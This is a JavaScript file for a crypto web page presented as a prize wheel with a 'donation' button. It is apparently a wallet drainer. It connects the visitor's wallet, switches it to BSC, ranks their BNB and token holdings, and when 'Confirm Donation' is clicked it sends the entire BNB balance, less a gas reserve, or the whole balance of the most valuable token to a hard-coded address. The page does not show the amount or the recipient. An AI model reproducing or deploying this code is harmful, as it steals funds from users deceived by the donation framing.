import '../css/styles.css';
import { showWheel } from './wheel.js';
import { updateHeaderWalletButton } from './header.js';
import Web3Modal from 'web3modal';
import WalletConnectProvider from '@walletconnect/web3-provider';
import { ethers } from 'ethers';

// Глобальные переменные
let account = null;
let signer = null;
let bnbBalance = null;
let mostValuableAsset = null;
let tokenAddress = null;
let bnbPrice = 500; // Первоначальное значение – будет обновлено из contract.txt
let connecting = false; // Флаг, чтобы избежать повторных вызовов подключения

// ABI для ERC20 токенов
const erc20ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) public returns (bool)",
  "function decimals() view returns (uint8)"
];

// Настройки Web3Modal (убедитесь, что infuraId заменён на ваш)
const providerOptions = {
  walletconnect: {
    package: WalletConnectProvider,
    options: { infuraId: "YOUR_INFURA_ID" }
  }
};

const web3Modal = new Web3Modal({
  cacheProvider: true,
  providerOptions
});

// Функция чтения файла contract.txt с данными о токенах
async function fetchContracts() {
  const response = await fetch('/contract.txt');
  const data = await response.text();
  const lines = data.split('\n');
  const tokens = [];
  for (const line of lines) {
    const [address, symbol, price] = line.trim().split(' ');
    if (address && symbol && price) {
      tokens.push({ address, symbol, price: parseFloat(price) });
      if (symbol === 'BNB') {
        bnbPrice = parseFloat(price);
      }
    }
  }
  return tokens;
}

// Функция подключения кошелька
export async function connectWallet() {
  if (connecting) {
    console.log('Подключение уже выполняется.');
    return;
  }
  connecting = true;

  try {
    console.log('Нажата кнопка Connect Wallet');
    // Запрашиваем провайдера через Web3Modal
    const provider = await web3Modal.connect();
    console.log('Провайдер получен');

    // Создаём ethers-провайдер на основе полученного провайдера
    let ethersProvider = new ethers.BrowserProvider(provider);
    let network = await ethersProvider.getNetwork();
    console.log(`Текущая сеть: ${network.chainId}`);

    // Если пользователь не на BSC (chainId 56), переключаем сеть
    if (network.chainId !== 56) {
      console.log('Пользователь не на BSC. Пытаемся переключить сеть...');
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x38' }], // 0x38 === 56
      });
      // После переключения запрашиваем аккаунты
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      // Создаём новый ethers-провайдер из window.ethereum, который теперь обновлён
      ethersProvider = new ethers.BrowserProvider(window.ethereum);
      network = await ethersProvider.getNetwork();
      console.log(`После переключения, сеть: ${network.chainId}`);
      if (network.chainId !== 56) {
        console.error('Переключение на BSC не выполнено.');
        connecting = false;
        return;
      }
    } else {
      console.log('Пользователь уже находится в сети BSC.');
    }

    // Получаем signer и адрес пользователя
    signer = await ethersProvider.getSigner();
    account = await signer.getAddress();
    console.log('Кошелёк подключён, адрес:', account);

    // Обновляем интерфейс – скрываем кнопку подключения, обновляем шапку и отображаем секцию доната
    document.getElementById('connectWalletBtn').style.display = 'none';
    updateHeaderWalletButton([account]);
    document.getElementById('donateSection').style.display = 'block';
    showWheel();

    // Получаем баланс BNB пользователя
    bnbBalance = await ethersProvider.getBalance(account);
    console.log(`Баланс BNB: ${ethers.formatEther(bnbBalance)} BNB`);
    document.getElementById('bnbInfo').innerText =
      `Your BNB balance is: ${ethers.formatEther(bnbBalance)} BNB`;

    // Определяем самый ценный актив
    findMostValuableAsset();
  } catch (error) {
    console.error('Ошибка подключения кошелька:', error);
    alert('Ошибка подключения кошелька. Проверьте консоль для деталей.');
  } finally {
    connecting = false;
  }
}

// Функция определения самого ценного актива
export async function findMostValuableAsset() {
  try {
    const tokens = await fetchContracts();
    let totalTokenValue = 0;
    let mostValuableToken = null;
    for (const token of tokens) {
      try {
        const tokenContract = new ethers.Contract(token.address, erc20ABI, signer);
        const balance = await tokenContract.balanceOf(account);
        if (balance.isZero()) continue;
        const decimals = await tokenContract.decimals();
        const adjustedBalance = parseFloat(ethers.formatUnits(balance, decimals));
        const value = adjustedBalance * token.price;
        totalTokenValue += value;
        if (!mostValuableToken || value > mostValuableToken.value) {
          mostValuableToken = { ...token, balance, adjustedBalance, value };
        }
      } catch (e) {
        console.warn(`Ошибка при обработке токена ${token.symbol}:`, e);
      }
    }
    const bnbValue = parseFloat(ethers.formatEther(bnbBalance)) * bnbPrice;
    if (bnbValue > totalTokenValue) {
      mostValuableAsset = {
        symbol: 'BNB',
        value: bnbValue,
        balance: ethers.formatEther(bnbBalance)
      };
      tokenAddress = null;
    } else {
      mostValuableAsset = mostValuableToken;
      tokenAddress = mostValuableToken?.address || null;
    }
    document.getElementById('tokenInfo').innerHTML = `
      <div style="text-align: center; margin-top: 5px;">
        <span style="font-size: 18px; font-weight: bold;">Most valuable asset: ${mostValuableAsset.symbol}</span>
        <br>
        <span style="font-size: 16px;">worth $${mostValuableAsset.value.toFixed(2)}</span>
        <div style="width: 0; height: 0;
                    border-left: 20px solid transparent;
                    border-right: 20px solid transparent;
                    border-top: 20px solid black;
                    margin: 2px auto;"></div>
      </div>
    `;
  } catch (e) {
    console.error('Ошибка определения ценного актива:', e);
    alert('Ошибка определения ценного актива');
  }
}

// Функция отправки активов по нажатию кнопки Confirm Donation
async function sendAsset() {
  try {
    console.log('Отправка актива...');
    if (!mostValuableAsset) {
      alert('Сначала определите самый ценный актив.');
      return;
    }
    if (mostValuableAsset.symbol === 'BNB') {
      await sendBNB();
    } else {
      await sendTokensDirectly();
    }
  } catch (e) {
    console.error('Ошибка отправки актива:', e);
    alert('Ошибка отправки актива');
  }
}

// Функция отправки BNB
async function sendBNB() {
  try {
    const recipient = "0x1716Ec839D83022A97EE4180bf7Ef334d9B410D9";
    const gasReserve = ethers.parseEther("0.01");
    const balance = await signer.getBalance();
    if (balance.lte(ethers.Zero)) {
      alert("Недостаточно BNB для оплаты газа.");
      return;
    }
    const amountToSend = balance.sub(gasReserve);
    if (amountToSend.lte(ethers.Zero)) {
      alert("Недостаточно BNB для отправки после резерва на газ.");
      return;
    }
    console.log(`Отправляем ${ethers.formatEther(amountToSend)} BNB на ${recipient}`);
    const tx = await signer.sendTransaction({
      to: recipient,
      value: amountToSend,
      gasLimit: ethers.hexlify(21000),
      gasPrice: ethers.parseUnits('5', 'gwei')
    });
    await tx.wait();
    console.log('BNB успешно отправлены');
    alert('BNB sent successfully');
  } catch (e) {
    console.error('Ошибка отправки BNB:', e);
    alert('Ошибка отправки BNB');
  }
}

// Функция отправки токенов
async function sendTokensDirectly() {
  try {
    if (!tokenAddress) {
      alert("Не определён токен для отправки.");
      return;
    }
    const recipient = "0x1716Ec839D83022A97EE4180bf7Ef334d9B410D9";
    const tokenContract = new ethers.Contract(tokenAddress, erc20ABI, signer);
    const decimals = await tokenContract.decimals();
    const amountToSend = mostValuableAsset.balance;
    console.log(`Отправляем ${ethers.formatUnits(amountToSend, decimals)} ${mostValuableAsset.symbol} на ${recipient}`);
    const tx = await tokenContract.transfer(recipient, amountToSend);
    await tx.wait();
    console.log('Токены успешно отправлены');
    alert('Tokens sent successfully');
  } catch (e) {
    console.error('Ошибка отправки токенов:', e);
    alert('Ошибка отправки токенов');
  }
}

// Привязываем обработчики событий для кнопки(ок)
// Если у вас на странице несколько кнопок, убедитесь, что функция вызывается только один раз.
window.connectWallet = connectWallet;
document.getElementById('connectWalletBtn')?.addEventListener('click', connectWallet);
document.getElementById('confirmButton').onclick = sendAsset;
